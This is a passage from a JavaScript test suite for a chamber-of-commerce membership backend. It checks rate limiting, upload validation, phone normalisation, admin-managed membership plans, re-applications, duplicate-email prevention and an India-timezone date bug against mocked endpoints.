  // Vary the source network — otherwise the per-IP flood limit (correctly)
  // cuts the loop off at 10.
  const res2 = await call(enquiries, {
    method: 'POST',
    ip: `198.51.100.${i}`,
    body: { name: `Person ${i}`, email: `p${i}@example.com`, phone: '9876543210', subject: 'Hello', message: 'Testing' },
  });
  if (res2.statusCode === 201) ids.add(res2.body.enquiry.id);
}
check('40 enquiries produced 40 distinct IDs', ids.size === 40, `got ${ids.size}`);

r = await call(enquiries, { method: 'GET', token: adminToken });
check('admin can read enquiries', r.statusCode === 200 && r.body.enquiries.length === 40, `got ${r.body?.enquiries?.length}`);

// The per-IP limiter should still bite when one source floods.
let blocked = 0;
for (let i = 0; i < 15; i++) {
  const res3 = await call(enquiries, {
    method: 'POST', ip: '192.0.2.77',
    body: { name: `Flood ${i}`, email: `flood${i}@example.com`, phone: '9876543210', subject: 'Hi', message: 'Spam' },
  });
  if (res3.statusCode === 429) blocked++;
}
check('flooding from one IP gets rate-limited', blocked > 0, `blocked ${blocked} of 15`);

// ════════════════════════════════════════════════════════════════════
section('Validation');

{
  // Uploads cut short keep their first bytes, so the end must be checked too.
  const { validateFileSignature } = await import(`${BCCI}/_lib/validation.js`);
  const uri = (mime, buf) => `data:${mime};base64,${buf.toString('base64')}`;
  const png = Buffer.from(TINY_PNG.split(',')[1], 'base64');
  const jpeg = Buffer.concat([Buffer.from([0xFF, 0xD8, 0xFF, 0xE0]), Buffer.alloc(200, 7), Buffer.from([0xFF, 0xD9])]);
  const pdf = Buffer.from('%PDF-1.4\n1 0 obj\n<<>>\nendobj\ntrailer\n<<>>\n%%EOF\n', 'latin1');
  const webpBody = Buffer.concat([Buffer.from('WEBP', 'latin1'), Buffer.alloc(100, 1)]);
  const webpSize = Buffer.alloc(4); webpSize.writeUInt32LE(webpBody.length, 0);
  const webp = Buffer.concat([Buffer.from('RIFF', 'latin1'), webpSize, webpBody]);
  for (const [name, mime, buf] of [['PNG', 'image/png', png], ['JPEG', 'image/jpeg', jpeg], ['PDF', 'application/pdf', pdf], ['WEBP', 'image/webp', webp]]) {
    check(`a complete ${name} is accepted`, validateFileSignature(uri(mime, buf)).ok === true, JSON.stringify(validateFileSignature(uri(mime, buf))));
    const cut = validateFileSignature(uri(mime, buf.subarray(0, Math.floor(buf.length * 0.6))));
    check(`a ${name} cut short is refused as incomplete`, cut.ok === false && /incomplete/.test(cut.error || ''), JSON.stringify(cut));
  }
}

r = await call(enquiries, { method: 'POST', body: { name: 'A', email: 'nope', phone: '123', subject: '', message: '' } });
check('invalid enquiry → 400', r.statusCode === 400, `got ${r.statusCode}`);

r = await call(sendOtp, { method: 'POST', body: { email: 'not-an-email' } });
check('invalid email for OTP → 400', r.statusCode === 400, `got ${r.statusCode}`);

const { cleanPhone } = await import(`${BCCI}/_lib/http.js`);
check('cleanPhone strips +91 country code', cleanPhone('+91 98250 12345') === '9825012345');
check('cleanPhone strips 91 country code prefix', cleanPhone('919825012345') === '9825012345');
check('cleanPhone strips trunk 0 prefix', cleanPhone('09825012345') === '9825012345');
check('cleanPhone preserves 10-digit number', cleanPhone('9825012345') === '9825012345');

r = await call(enquiries, {
  method: 'POST',
  ip: '203.0.113.199',
  body: { name: 'Prefix User', email: 'prefix@example.com', phone: '+91 9898123456', subject: 'Inquiry', message: 'Hello BCCI' },
});
check('enquiry with +91 phone succeeds (201)', r.statusCode === 201, `got ${r.statusCode}`);
check('enquiry phone is normalized to 10 digits', r.body?.enquiry?.phone === '9898123456', `got ${r.body?.enquiry?.phone}`);

// ════════════════════════════════════════════════════════════════════
section('Admin-managed membership types');

r = await call(membershipPlans, { method: 'GET' });
const builtInPlans = r.body?.plans || [];
check('GET /api/membership-plans is public → 200', r.statusCode === 200, `got ${r.statusCode}`);
check('lists the 8 built-in types', builtInPlans.length === 8 && builtInPlans.every((p) => p.builtIn), JSON.stringify(builtInPlans.map((p) => p.label)));
check('Corporate VIP is listed at ₹1,00,000', builtInPlans.some((p) => p.label === 'Corporate VIP Membership - ₹1,00,000/-' && p.fee === 100000));

r = await call(membershipPlans, { method: 'POST', body: { name: 'Platinum Membership', fee: 50000 } });
check('POST without a token → 401', r.statusCode === 401, `got ${r.statusCode}`);
r = await call(membershipPlans, { method: 'POST', token: applicantToken, body: { name: 'Platinum Membership', fee: 50000 } });
check('applicant cannot add a membership type → 401', r.statusCode === 401, `got ${r.statusCode}`);

r = await call(membershipPlans, { method: 'POST', token: adminToken, body: { name: '  Platinum   Membership ', fee: '50,000' } });
check('admin adds a membership type → 201', r.statusCode === 201, JSON.stringify(r.body));
check('label is built from the name and amount', r.body?.plan?.label === 'Platinum Membership - ₹50,000/-', r.body?.plan?.label);
const platinumId = r.body?.plan?.id;

r = await call(membershipPlans, { method: 'GET' });
const withPlatinum = r.body?.plans || [];
const platinum = withPlatinum.find((p) => p.id === platinumId);
check('new type is listed publicly as admin-added', platinum && platinum.builtIn === false && platinum.fee === 50000, JSON.stringify(platinum));
check('public listing does not expose the admin who added it', !JSON.stringify(r.body).includes('admin@bccibharuch.in'));
check('listing is ordered by amount', withPlatinum.every((p, i) => i === 0 || withPlatinum[i - 1].fee <= p.fee), JSON.stringify(withPlatinum.map((p) => p.fee)));

r = await call(membershipPlans, { method: 'POST', token: adminToken, body: { name: 'platinum membership', fee: 60000 } });
check('same name again (any case or amount) → 409', r.statusCode === 409, `got ${r.statusCode}`);
r = await call(membershipPlans, { method: 'POST', token: adminToken, body: { name: 'Corporate VIP Membership', fee: 90000 } });
check('name of a built-in type → 409', r.statusCode === 409, `got ${r.statusCode}`);

for (const [label, body] of [
  ['zero amount', { name: 'Zero Plan', fee: 0 }],
  ['fractional amount', { name: 'Fraction Plan', fee: '1.5' }],
  ['non-numeric amount', { name: 'Text Plan', fee: 'abc' }],
  ['missing amount', { name: 'No Fee Plan' }],
  ['amount over ₹1 crore', { name: 'Huge Plan', fee: 10000001 }],
  ['too-short name', { name: 'ab', fee: 100 }],
  ['markup in the name', { name: '<script>x</script>', fee: 100 }],
  ['rupee sign in the name', { name: 'Gold ₹500', fee: 500 }],
]) {
  r = await call(membershipPlans, { method: 'POST', token: adminToken, body });
  check(`rejects ${label} → 400`, r.statusCode === 400, `got ${r.statusCode} ${JSON.stringify(r.body)}`);
}

await call(sendOtp, { method: 'POST', ip: '203.0.113.91', body: { email: 'platinum@example.com' } });
const otpPlatinum = JSON.parse(mock.store.get('bcci:otp:platinum@example.com'));
r = await call(verifyOtp, { method: 'POST', ip: '203.0.113.91', body: { email: 'platinum@example.com', code: otpPlatinum, name: 'Platinum Member' } });
const platinumToken = r.body?.session?.token;
const platinumApp = (overrides) => validApp({
  company: 'Platinum Polymers Pvt Ltd', repName: 'Meera Desai', gstNo: '24BBBBB1111B1Z5', panNo: 'BBBBB1111B',
  membershipPlan: 'Platinum Membership - ₹50,000/-', ...overrides,
});

r = await call(applications, { method: 'POST', token: platinumToken, ip: '203.0.113.92', body: platinumApp({ paymentAmount: '5000' }) });
check('application on the new type with the wrong amount → 400', r.statusCode === 400 && /expected ₹50,000\/-/.test(r.body?.error || ''), JSON.stringify(r.body));

r = await call(applications, { method: 'POST', token: platinumToken, ip: '203.0.113.93', body: platinumApp({ paymentAmount: '50000' }) });
check('application on the new type at its amount → 201', r.statusCode === 201, JSON.stringify(r.body));
check('application stores the new type and its fee',
  r.body?.application?.membershipPlan === 'Platinum Membership - ₹50,000/-' && String(r.body?.application?.paymentAmount) === '50000',
  JSON.stringify({ plan: r.body?.application?.membershipPlan, amount: r.body?.application?.paymentAmount }));

r = await call(membershipPlans, { method: 'DELETE', query: { id: platinumId } });
check('DELETE without a token → 401', r.statusCode === 401, `got ${r.statusCode}`);
r = await call(membershipPlans, { method: 'DELETE', token: adminToken, query: { id: 'corporate-vip-membership' } });
check('built-in types cannot be deleted → 400', r.statusCode === 400, `got ${r.statusCode}`);
r = await call(membershipPlans, { method: 'DELETE', token: adminToken, query: { id: platinumId } });
check('admin deletes the added type → 200', r.statusCode === 200, JSON.stringify(r.body));
r = await call(membershipPlans, { method: 'DELETE', token: adminToken, query: { id: platinumId } });
check('deleting it again → 404', r.statusCode === 404, `got ${r.statusCode}`);

r = await call(membershipPlans, { method: 'GET' });
check('deleted type is no longer listed', !(r.body?.plans || []).some((p) => p.id === platinumId));

r = await call(applications, { method: 'POST', token: applicantToken, ip: '203.0.113.94', body: validApp({ membershipPlan: 'Platinum Membership - ₹50,000/-' }) });
check('application on a deleted type → 400', r.statusCode === 400 && /valid membership type/.test(r.body?.error || ''), JSON.stringify(r.body));

r = await call(membershipPlans, { method: 'PUT', token: adminToken, body: {} });
check('unsupported method → 405', r.statusCode === 405, `got ${r.statusCode}`);

// ════════════════════════════════════════════════════════════════════
section('Review fixes: re-apply, stale claims, status typos, renewals, sign-in limits');

async function applicantSession(email, ip) {
  await call(sendOtp, { method: 'POST', ip, body: { email } });
  const code = JSON.parse(mock.store.get(`bcci:otp:${email}`));
  const v = await call(verifyOtp, { method: 'POST', ip, body: { email, code, name: 'Test Person' } });
  return v.body?.session?.token;
}

// A rejected applicant can file again, under the same id.
const reapplyToken = await applicantSession('reapply@example.com', '203.0.113.150');
r = await call(applications, { method: 'POST', token: reapplyToken, ip: '203.0.113.151', body: validApp({ company: 'First Try Ltd', email: 'office@firsttry.example' }) });
const reapplyId = r.body?.applicationId;
check('distinct official email is kept alongside the sign-in email',
  r.body?.application?.officialEmail === 'office@firsttry.example' && r.body?.application?.email === 'reapply@example.com', JSON.stringify(r.body?.application?.officialEmail));
// The public QR check answers a pending or rejected application exactly as it
// answers an unknown ID: no company, no representative, no status.
const verifyIp = '203.0.113.170';
const unknownVerify = await call(applications, { method: 'GET', query: { verifyId: 'BCCI-0-00000000' }, ip: verifyIp });
r = await call(applications, { method: 'GET', query: { verifyId: reapplyId }, ip: verifyIp });
check('verify on a pending application → 404, same body as an unknown ID',
  r.statusCode === 404 && JSON.stringify(r.body) === JSON.stringify(unknownVerify.body), `${r.statusCode} ${JSON.stringify(r.body)}`);
await call(applications, { method: 'PATCH', token: adminToken, body: { id: reapplyId, status: 'Rejected', reason: 'Blurry PAN scan' } });
r = await call(applications, { method: 'GET', query: { verifyId: reapplyId }, ip: verifyIp });
check('verify on a rejected application → 404, same body as an unknown ID',
  r.statusCode === 404 && JSON.stringify(r.body) === JSON.stringify(unknownVerify.body), `${r.statusCode} ${JSON.stringify(r.body)}`);
check('a refused verify names neither the company nor the representative',
  r.body?.member === undefined && !JSON.stringify(r.body).includes('First Try') && !JSON.stringify(r.body).includes(validApp().repName));
r = await call(applications, { method: 'POST', token: reapplyToken, ip: '203.0.113.152', body: validApp({ company: 'Second Try Ltd' }) });
check('a rejected applicant can re-apply → 201', r.statusCode === 201, JSON.stringify(r.body).slice(0, 200));
check('the resubmission keeps the id and is Pending again',
  r.body?.application?.id === reapplyId && r.body?.application?.status === 'Pending' && r.body?.application?.company === 'Second Try Ltd');
check('the earlier rejection is kept in history, not on the live record',
  r.body?.application?.rejectionReason === undefined && r.body?.application?.previousSubmissions?.[0]?.rejectionReason === 'Blurry PAN scan');
check('the resubmission moves to the top of the admin list',
  (await call(applications, { method: 'GET', token: adminToken })).body?.applications?.[0]?.id === reapplyId);
r = await call(applications, { method: 'POST', token: reapplyToken, ip: '203.0.113.153', body: validApp() });
check('a pending resubmission still blocks a third filing → 409', r.statusCode === 409, `got ${r.statusCode}`);

// An email claim left behind by a crash between the claim and the record write.
const staleToken = await applicantSession('stale@example.com', '203.0.113.154');
mock.store.set('bcci:app_email:stale@example.com', 'BCCI-ghost-record');
r = await call(applications, { method: 'POST', token: staleToken, ip: '203.0.113.155', body: validApp({ company: 'Stale Claim Ltd' }) });
check('a stale email claim is taken over → 201', r.statusCode === 201, JSON.stringify(r.body).slice(0, 200));
check('the claim now points at the new record', mock.store.get('bcci:app_email:stale@example.com') === JSON.stringify(r.body?.applicationId) || mock.store.get('bcci:app_email:stale@example.com') === r.body?.applicationId);

// A deliberate 4xx from deeper code reaches the client as itself, not a 500.
const { withErrorHandling } = await import(`${BCCI}/_lib/http.js`);
const conflictRoute = withErrorHandling('Test', async () => { throw Object.assign(new Error('Already exists.'), { statusCode: 409 }); });
r = await call(conflictRoute);
check('withErrorHandling passes a thrown 409 through', r.statusCode === 409 && r.body?.error === 'Already exists.', JSON.stringify(r.body));
const crashRoute = withErrorHandling('Test', async () => { throw new Error('db exploded'); });
r = await call(crashRoute);
check('an unexpected error is still a generic 500', r.statusCode === 500 && !/exploded/.test(r.body?.error || ''));

r = await call(applications, { method: 'PATCH', token: adminToken, body: { id: appId, status: 'Approve' } });
check('a misspelt status is refused, not turned into Pending', r.statusCode === 400, `got ${r.statusCode}`);

// Renewals are priced from the member's plan.
r = await call(applications, { method: 'PATCH', token: applicantToken, body: { id: appId, action: 'renew', paymentRef: 'UPI/CHEAP1', paymentAmount: '1' } });
check('a renewal claiming the wrong amount → 400', r.statusCode === 400 && /mismatch/.test(r.body?.error || ''), JSON.stringify(r.body));
r = await call(applications, { method: 'PATCH', token: applicantToken, body: { id: appId, action: 'renew', paymentRef: 'UPI/PRICED1' } });
check('the pending renewal records the amount due', r.statusCode === 200 && r.body?.application?.pendingRenewal?.amount === 5000, JSON.stringify(r.body?.application?.pendingRenewal));
await call(applications, { method: 'PATCH', token: adminToken, body: { id: appId, action: 'reject-renewal', reason: 'test' } });
r = await call(applications, { method: 'PATCH', token: applicantToken, body: { id: appId, action: 'renew', paymentRef: 'UPI/PRICED2', paymentAmount: '5000' } });
check('a renewal sending the displayed fee is accepted', r.statusCode === 200 && r.body?.application?.pendingRenewal?.amount === 5000, JSON.stringify(r.body).slice(0, 160));

// Successful sign-ins do not count toward the lockout.
const loginEmail = 'admin@bccibharuch.in';
let lastLogin;
for (let i = 0; i < 12; i++) {
  lastLogin = await call(adminAuth, { method: 'POST', ip: '203.0.113.160', body: { username: loginEmail, password: 'correct-horse-battery-staple' } });
}
check('twelve successful admin sign-ins in a row are never rate-limited', lastLogin.statusCode === 200, `got ${lastLogin.statusCode}`);

// ── Review fixes: one email per decision, no "None", today's date ──
{
  const emailLog = () => {
    const raw = mock.store.get('bcci:email_log');
    return raw ? JSON.parse(raw) : [];
  };
  const tok = await applicantSession('once@example.com', '203.0.113.180');
  const filed = await call(applications, { method: 'POST', token: tok, ip: '203.0.113.181', body: validApp({ company: 'Once Only Ltd' }) });
  const onceId = filed.body?.applicationId;
  const approvalsFor = () => emailLog().filter((e) => e.type === 'application_approved' && e.to?.includes('once@example.com')).length;
  const [a1, a2] = await Promise.all([
    call(applications, { method: 'PATCH', token: adminToken, body: { id: onceId, status: 'Approved' } }),
    call(applications, { method: 'PATCH', token: adminToken, body: { id: onceId, status: 'Approved' } }),
  ]);
  const okCount = [a1, a2].filter((x) => x.statusCode === 200).length;
  check('a double-clicked approval sends the approval email once', okCount >= 1 && approvalsFor() === 1, `${a1.statusCode}/${a2.statusCode}, ${approvalsFor()} emails`);
  await call(applications, { method: 'PATCH', token: adminToken, body: { id: onceId, status: 'Approved' } });
  check('approving an already-approved application sends nothing new', approvalsFor() === 1, `${approvalsFor()} emails`);

  const noneTok = await applicantSession('none@example.com', '203.0.113.182');
  r = await call(applications, { method: 'POST', token: noneTok, ip: '203.0.113.183', body: validApp({ legalStatus: 'None' }) });
  check('"None" is refused as a legal status', r.statusCode === 400 && /legal status/i.test(r.body?.error || ''), `${r.statusCode} ${JSON.stringify(r.body)}`);
  r = await call(applications, { method: 'POST', token: noneTok, ip: '203.0.113.183', body: validApp({ enterpriseType: 'none' }) });
  check('"None" is refused as an enterprise category', r.statusCode === 400 && /enterprise category/i.test(r.body?.error || ''), `${r.statusCode} ${JSON.stringify(r.body)}`);

  const todayIst = new Date(Date.now() + 330 * 60 * 1000).toISOString().slice(0, 10);
  const tomorrowIst = new Date(Date.now() + 330 * 60 * 1000 + 86400000).toISOString().slice(0, 10);
  r = await call(applications, { method: 'POST', token: noneTok, ip: '203.0.113.183', body: validApp({ regDate: tomorrowIst }) });
  check("tomorrow's date (India) is refused as a registration date", r.statusCode === 400 && /future/.test(r.body?.error || ''), `${r.statusCode} ${JSON.stringify(r.body)}`);
  r = await call(applications, { method: 'POST', token: noneTok, ip: '203.0.113.183', body: validApp({ regDate: todayIst }) });
  check("today's date (India) is accepted as a registration date", r.statusCode === 201, `${r.statusCode} ${JSON.stringify(r.body)}`);

  // The bug only showed between midnight and 05:30 IST, so freeze the clock
  // there: 02:00 IST on 30 Oct 2026 is 20:30 UTC on the 29th.
  const clockTok = await applicantSession('clock@example.com', '203.0.113.184');
  const RealDate = Date;
  const frozen = RealDate.UTC(2026, 9, 29, 20, 30);
  globalThis.Date = class extends RealDate {
    constructor(...args) { super(...(args.length ? args : [frozen])); }
    static now() { return frozen; }
  };
  try {
    r = await call(applications, { method: 'POST', token: clockTok, ip: '203.0.113.185', body: validApp({ regDate: '2026-10-30' }) });
  } finally {
    globalThis.Date = RealDate;
  }
  check("at 02:00 IST, that day's date is accepted (not 'in the future')", r.statusCode === 201, `${r.statusCode} ${JSON.stringify(r.body)}`);
}

// ── Report ──────────────────────────────────────────────────────────
process.on("exit",()=>{});
console.log(results.join('\n'));
console.log(`\n${'═'.repeat(52)}`);
console.log(`  ${pass} passed, ${fail} failed`);
console.log('═'.repeat(52));

mock.server.close();
process.exit(fail ? 1 : 0);
